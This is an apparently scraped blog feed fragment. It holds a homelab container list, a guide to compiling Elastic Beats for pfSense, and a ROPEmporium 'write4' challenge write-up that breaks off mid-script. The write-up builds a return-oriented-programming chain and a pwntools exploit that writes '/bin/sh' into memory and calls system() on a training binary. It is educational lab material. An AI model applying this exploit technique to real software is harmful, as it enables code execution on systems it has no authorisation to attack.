  &lt;li&gt;Added: Rancher-Master &amp;amp; Rancher-Worker 01/02&lt;/li&gt;
  &lt;li&gt;Removed: WebCalendar&lt;/li&gt;
  &lt;li&gt;Container: Portainer/Portainer&lt;/li&gt;
  &lt;li&gt;Container: Linuxserver/Heimdall&lt;/li&gt;
  &lt;li&gt;Container: Securitybits-io/jkk-WebCalendar&lt;/li&gt;
  &lt;li&gt;Container: Covenant/Covenant&lt;/li&gt;
  &lt;li&gt;Container: Yogeshojha/Rengine&lt;/li&gt;
  &lt;li&gt;Container: Ctdc/Spiderfoot&lt;/li&gt;
  &lt;li&gt;Container: Mpepping/CyberChef&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Christoffer Claesson</name></author><category term="homelab" /><category term="security" /><summary type="html">Disclaimer, this is subject to change… very often and very quickly!</summary></entry><entry><title type="html">Beats 7.5.0 on PFsense 2.4.4</title><link href="/beats-7-5-0-on-pfsense" rel="alternate" type="text/html" title="Beats 7.5.0 on PFsense 2.4.4" /><published>2019-12-11T00:00:00+00:00</published><updated>2019-12-11T00:00:00+00:00</updated><id>/beats-7-5-0-on-pfsense</id><content type="html" xml:base="/beats-7-5-0-on-pfsense">&lt;blockquote&gt;
  &lt;p&gt;Long time wanting a beats client to PFSense which runs on FreeBSD, so lets compile it our self from source!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;There is always the option to send it via syslog, but it would be easier just using the beats to parse and send logs to a centralized logging platform. in this case a Hot-Warm elastic search cluster fronted by two Logstash machines (definitely overkill though).&lt;/p&gt;

&lt;h2 id=&quot;initial-setup&quot;&gt;Initial Setup&lt;/h2&gt;

&lt;p&gt;So for this task I’ll be using Vagrant in order to simple have a VM that I can build the beats from the git source.&lt;/p&gt;

&lt;p&gt;Best way to install with current instructions is using the official &lt;a href=&quot;https://www.vagrantup.com/docs/installation/&quot;&gt;Vagrant Installation Guide&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I’ll be also using Virtual box as a provider.&lt;/p&gt;

&lt;h3 id=&quot;vagrantfile&quot;&gt;Vagrantfile&lt;/h3&gt;

&lt;p&gt;Vagrant deploys virtual machines by a Vagrant File specification. We are compiling to a FreeBSD 11.2 system which means that we’ll also specify for vagrant to spin up such a box.&lt;/p&gt;

&lt;p&gt;My Vagrant file looks like following, now you can certainly put it somewhere else, but I just need the FreeBSD machine for this purpose, and will be destroyed after this compile hence putting it into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp.&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@ubuntu:~# mkdir freebsd-compile
root@ubuntu:~# cd freebsd-compile/^C
root@ubuntu:~# mkdir -p /tmp/freebsd-compile
root@ubuntu:~# cd /tmp/freebsd-compile/
root@ubuntu:/tmp/freebsd-compile# cat &amp;lt;&amp;lt;EOF &amp;gt; Vagrantfile
&amp;gt; Vagrant.configure(&quot;2&quot;) do |config|
&amp;gt; config.vm.box = &quot;freebsd/FreeBSD-11.2-RELEASE&quot;
&amp;gt; config.vm.box_version = &quot;2018.06.22&quot;
&amp;gt; end
&amp;gt; EOF
root@Valkyrie:/tmp/freebsd-compile# cat Vagrantfile
Vagrant.configure(&quot;2&quot;) do |config|
  config.vm.box = &quot;freebsd/FreeBSD-11.2-RELEASE&quot;
  config.vm.box_version = &quot;2018.06.22&quot;
end
root@Valkyrie:/tmp/freebsd-compile#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Good now that’s all we need for our host system, lets start up the VM by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vagrant up&lt;/code&gt; in the vagrant file directory and wait.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@ubuntu:/tmp/freebsd-compile# vagrant up
Bringing machine 'default' up with 'virtualbox' provider...
==&amp;gt; default: Importing base box 'freebsd/FreeBSD-11.2-RELEASE'...
==&amp;gt; default: Generating MAC address for NAT networking...
==&amp;gt; default: Checking if box 'freebsd/FreeBSD-11.2-RELEASE' version '2018.06.22' is up to date...
[... snip ...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now for me it did toss some errors trying to remote connect, but fear not. The machine is provisioned and started and we can now connect to it using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vagrant ssh&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Valkyrie:/tmp/freebsd-compile# vagrant ssh
FreeBSD 11.2-RELEASE-p14 (GENERIC) #0: Mon Aug 19 22:38:50 UTC 2019

Welcome to FreeBSD!
[... snip ...]
vagrant@freebsd:~ % sudo su
root@freebsd:/home/vagrant # cd
root@freebsd:~ #
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now comes the compiling of beats. And for this chapter I actually want to give a very large kudos to &lt;a href=&quot;https://github.com/jakommo&quot;&gt;Jakommo&lt;/a&gt; who came up with it, but its too good not to have it drown in a &lt;a href=&quot;https://github.com/elastic/beats/issues/1034#issuecomment-557276051&quot;&gt;github issue.&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;package-installation-and-compilation&quot;&gt;Package installation and Compilation&lt;/h2&gt;

&lt;p&gt;Now in order to succeed, we need a couple of packages installed into our VM.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@freebsd:~ # pkg install git gmake go bash
Updating FreeBSD repository catalogue...
FreeBSD repository is up to date.
All repositories are up to date.
The following 25 package(s) will be affected (of 0 checked):

New packages to be INSTALLED:
    git: 2.23.0
    [... snip ...]
    cvsps: 2.1_2

Number of packages to be installed: 25
Proceed with this action? [y/N]: y

root@freebsd:~ #
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we have all the dependencies in order to compile, lets get the code and checkout the correct version. (I deliberately removed a lot of the output as that is of no importance if it throws no errors)&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@freebsd:~ # go get github.com/elastic/beats
root@freebsd:~ # cd src/github.com/elastic/beats/
root@freebsd:~/src/github.com/elastic/beats # git checkout v7.5.0
Note: switching to 'v7.5.0'.
root@freebsd:~/src/github.com/elastic/beats # cd /filebeat
root@freebsd:~/src/github.com/elastic/beats/filebeat # gmake
root@freebsd:~/src/github.com/elastic/beats/filebeat # file filebeat
filebeat: ELF 64-bit LSB executable, x86-64, version 1 (FreeBSD)...
root@freebsd:~/src/github.com/elastic/beats/filebeat # ./filebeat version
filebeat version 7.5.0 (amd64), libbeat 7.5.0 ....
root@freebsd:~/src/github.com/elastic/beats/metricbeat # ./metricbeat version
metricbeat version 7.5.0 (amd64), libbeat 7.5.0 ....
root@freebsd:~/src/github.com/elastic/beats/metricbeat #
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now its just a matter of copy the filebeat binary to your pfsense and configure it according to the beats documentation.&lt;/p&gt;

&lt;p&gt;Note: This also work for auditbeat, packetbeat and metricbeat. but would be a redundant wall of text showing all 4 binaries.&lt;/p&gt;

&lt;p&gt;Again all credit goes to &lt;a href=&quot;https://github.com/jakommo&quot;&gt;Jakommo&lt;/a&gt; for writing the comment on Github.&lt;/p&gt;</content><author><name>Christoffer Claesson</name></author><category term="homelab" /><category term="security" /><summary type="html">Long time wanting a beats client to PFSense which runs on FreeBSD, so lets compile it our self from source!</summary></entry><entry><title type="html">ROPEmporium: 3-Write4 (64-bit)</title><link href="/ropemporium-3-write4" rel="alternate" type="text/html" title="ROPEmporium: 3-Write4 (64-bit)" /><published>2019-12-03T00:00:00+00:00</published><updated>2019-12-03T00:00:00+00:00</updated><id>/ropemporium-3-write4</id><content type="html" xml:base="/ropemporium-3-write4">&lt;blockquote&gt;
  &lt;p&gt;Moving on to the 4th instalment of this series with Write4&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Continuing on the series of ROPEmporium, lets do number 3 “Write4”.&lt;/p&gt;

&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;On completing our usual checks for interesting strings and symbols in this binary we’re confronted with the stark truth that our favourite string “/bin/cat flag.txt” is not present this time. Although you’ll see later that there are other ways around this problem, such as resolving dynamically loaded libraries and using the strings present in those, we’ll stick to the challenge goal which is learning how to get data into the target process’s virtual address space via the magic of ROP.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;setup&quot;&gt;Setup&lt;/h2&gt;
&lt;p&gt;There’s really nothing different from the other posts we’ve done so far. Download and unzip.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@linux:~/write4# wget https://ropemporium.com/binary/write4.zip
root@linux:~/write4# unzip write4.zip
root@linux:~/write4# ls
flag.txt write4 write4.zip
root@linux:~/write4# file write4
write4: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ab37f80904704258fda5656af18246786632b560, not stripped
root@linux:~# checksec write4
[*] '/root/Documents/courses/ropemporium/3-write4/write4'
    Arch: amd64-64-little
    RELRO: Partial RELRO
    Stack: No canary found
    NX: NX enabled
    PIE: No PIE (0x400000)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As per usual, the binary is not stripped (Hint: none of them are!). Nothing that’s really not out of the ordinary, lets execute the binary to see the input/output.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;write4 by ROP Emporium
64bits

Go ahead and give me the string already!
&amp;gt; securitybits.io

Exiting
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Again nothing out of the ordinary, lets toss it into radare2 and have a look at the symbols.&lt;/p&gt;

&lt;h2 id=&quot;radare2-reversing&quot;&gt;Radare2 Reversing&lt;/h2&gt;

&lt;p&gt;Running radare2 with the triple A flag cuts down the time and analyzes the file immediately.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@linux:~# r2 write4 -AAA
[Cannot analyze at 0x00400640g with sym. and entry0 (aa)
[x] Analyze all flags starting with sym. and entry0 (aa)
[... snip ...]
[x] Enable constraint types analysis for variables
 -- Experts agree, security holes suck, and we fixed some of them!
[0x00400650]&amp;gt; afl
0x00400650 1 41 entry0
0x00400610 1 6 sym.imp.__libc_start_main
0x00400680 4 50 -&amp;gt; 41 sym.deregister_tm_clones
0x004006c0 4 58 -&amp;gt; 55 sym.register_tm_clones
0x00400700 3 28 entry.fini0
0x00400720 4 38 -&amp;gt; 35 entry.init0
0x004007b5 1 82 sym.pwnme
0x00400600 1 6 sym.imp.memset
0x004005d0 1 6 sym.imp.puts
0x004005f0 1 6 sym.imp.printf
0x00400620 1 6 sym.imp.fgets
0x00400807 1 17 sym.usefulFunction
0x004005e0 1 6 sym.imp.system
0x004008a0 1 2 sym.__libc_csu_fini
0x004008a4 1 9 sym._fini
0x00400830 4 101 sym.__libc_csu_init
0x00400746 1 111 main
0x00400630 1 6 sym.imp.setvbuf
0x004005a0 3 26 sym._init
[0x00400650]&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Checking the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sym.usefulFunction&lt;/code&gt; reveals that there’s a systemcall, but it calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/ls&lt;/code&gt;. So the goal is to write &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh\x00&lt;/code&gt; somewhere in the binary, and use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system()&lt;/code&gt; to execute the string.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/iamges/posts/2019/12/ropemporium-3-write4/image-1.png&quot; alt=&quot;Radare2 useful symbols&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finding a home for our string should be fairly trivial, as we should be able to put it into the &lt;em&gt;.data&lt;/em&gt; section of the binary_._ As we can clearly see the perms on &lt;em&gt;.data&lt;/em&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-rw- (read/write).&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[0x00400650]&amp;gt; iS
[Sections]
Nm Paddr Size Vaddr Memsz Perms Name
00 0x00000000 0 0x00000000 0 ----
01 0x00000238 28 0x00400238 28 -r-- .interp
[... snip ...]
24 0x00001000 80 0x00601000 80 -rw- .got.plt
25 0x00001050 16 0x00601050 16 -rw- .data
26 0x00001060 0 0x00601060 48 -rw- .bss
[... snip ...]
30 0x00001800 738 0x00000000 738 ---- .strtab

[0x00400650]&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;findings-gadgets&quot;&gt;Findings Gadgets&lt;/h2&gt;

&lt;p&gt;So to summarize:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Finding write primitive to write string to &lt;em&gt;.data&lt;/em&gt; section&lt;/li&gt;
  &lt;li&gt;system address&lt;/li&gt;
  &lt;li&gt;pop_rdi (In order to put the &lt;em&gt;/bin/sh&lt;/em&gt; string in a register)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Fortunately, we have ropper!&lt;/p&gt;

&lt;h3 id=&quot;pop_rdi&quot;&gt;pop_rdi&lt;/h3&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@linux:~# ropper -f write4 --search 'pop rdi'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: write4
0x0000000000400893: pop rdi; ret;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;system&quot;&gt;System()&lt;/h3&gt;

&lt;p&gt;According to the &lt;em&gt;afl&lt;/em&gt; output, pointing at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sym.imp.system&lt;/code&gt;. It’s located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x004005e0&lt;/code&gt; so lets use that address.&lt;/p&gt;

&lt;h3 id=&quot;write-primitive&quot;&gt;Write primitive&lt;/h3&gt;

&lt;p&gt;Now in order to be able to write to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.data&lt;/code&gt;&lt;em&gt;,&lt;/em&gt; we need find a mov gadget reading and writing from addresses we control. And pop gadgets to populate the registers.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@linux:~# ropper -f write4 --search &quot;mov|pop&quot;
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov|pop

[INFO] File: write4
0x0000000000400821: mov dword ptr [rsi], edi; ret;
0x00000000004007ae: mov eax, 0; pop rbp; ret;
0x00000000004005b1: mov eax, dword ptr [rax]; add byte ptr [rax], al; add rsp, 8; ret;
0x00000000004005a5: mov eax, dword ptr [rip + 0x200a4d]; test rax, rax; je 0x5b5; call 0x640; add rsp, 8; ret;
0x000000000040073c: mov ebp, esp; call rax;
0x0000000000400809: mov ebp, esp; mov edi, 0x40090c; call 0x5e0; nop; pop rbp; ret;
0x00000000004007a4: mov edi, 0x4008d7; call 0x5d0; mov eax, 0; pop rbp; ret;
0x000000000040080b: mov edi, 0x40090c; call 0x5e0; nop; pop rbp; ret;
0x00000000004006a0: mov edi, 0x601060; jmp rax;
0x00000000004007fd: mov edi, eax; call 0x620; nop; leave; ret;
0x0000000000400820: mov qword ptr [r14], r15; ret;
0x00000000004005a4: mov rax, qword ptr [rip + 0x200a4d]; test rax, rax; je 0x5b5; call 0x640; add rsp, 8; ret;
0x000000000040073b: mov rbp, rsp; call rax;
0x0000000000400808: mov rbp, rsp; mov edi, 0x40090c; call 0x5e0; nop; pop rbp; ret;
0x00000000004007fc: mov rdi, rax; call 0x620; nop; leave; ret;
0x000000000040088c: pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040088e: pop r13; pop r14; pop r15; ret;
0x0000000000400890: pop r14; pop r15; ret;
0x0000000000400892: pop r15; ret;
0x000000000040069f: pop rbp; mov edi, 0x601060; jmp rax;
0x000000000040088b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040088f: pop rbp; pop r14; pop r15; ret;
0x00000000004006b0: pop rbp; ret;
0x0000000000400893: pop rdi; ret;
0x0000000000400891: pop rsi; pop r15; ret;
0x000000000040088d: pop rsp; pop r13; pop r14; pop r15; ret;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The gadget at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00400820&lt;/code&gt; looks simple enough, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov qword ptr [r14], r15; ret;&lt;/code&gt; a simple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov to_ptr, from_ptr&lt;/code&gt; then return. There is also a gadget at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00400890&lt;/code&gt; which pops both registers from the stack! This will in turn give us control over the &lt;em&gt;to&lt;/em&gt; and &lt;em&gt;from&lt;/em&gt; registers.&lt;/p&gt;

&lt;p&gt;In the spirit of good exploit development lets put hat into a function which takes a piece of data, and an address to write it to!&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;arbitrary_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#0x400890: pop r14; pop r15; ret;
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;#0x400820: mov qword ptr [r14], r15; ret;
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# pop reg
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# mov to_reg, from_reg
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# address &amp;gt; data &amp;gt; pop r14; pop r15; mov
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;pop_regs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400890&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mov_regs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400820&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mov_regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rop&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;putting-it-all-together&quot;&gt;Putting it all together&lt;/h2&gt;

&lt;p&gt;Now I wont bore you with creating a template or finding the overflow offset, as that can be found in the earlier blog posts. Constructing the ROP Chain will look something like the following:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[junk] + arbitrary_write(.data, &quot;/bin/sh\x00&quot;) + [pop_rdi] + [.data] + [system]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;final-exploit&quot;&gt;Final exploit&lt;/h3&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#Author: Christoffer.Claesson@Securitybits.io
#Blog: https://blog.securitybits.io/2019/12/03/ropemporium-3-write4-64-bit/
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python2
# -*- coding: utf-8 -*-
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'write4'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'127.0.0.1'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'''Execute the target binary locally'''&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GDB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'''Connect to the process on the remote host'''&lt;/span&gt;
